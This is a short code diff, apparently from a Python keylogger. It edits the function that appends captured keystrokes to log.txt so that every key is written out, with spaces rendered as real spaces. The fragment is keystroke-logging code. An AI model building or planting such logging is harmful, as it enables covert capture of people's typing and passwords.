@@ -27,13 +27,10 @@ def write_file(keys):
     with open("log.txt", "a") as f:
         nr_of_keys = 0
         for key in keys:
-            k = str(key).replace("'", "")
+            k = str(key).replace("'", "").replace("Key.space", " ")
             nr_of_keys += 1
-            # if nr_of_keys == 50:
-            #     f.write("\n")
-            #     nr_of_keys = 0
-            # elif k.find("Key") == -1:
-            #     f.write(k)
+            f.write(k)
+            print(nr_of_keys)
 
 
 def key_release(key):
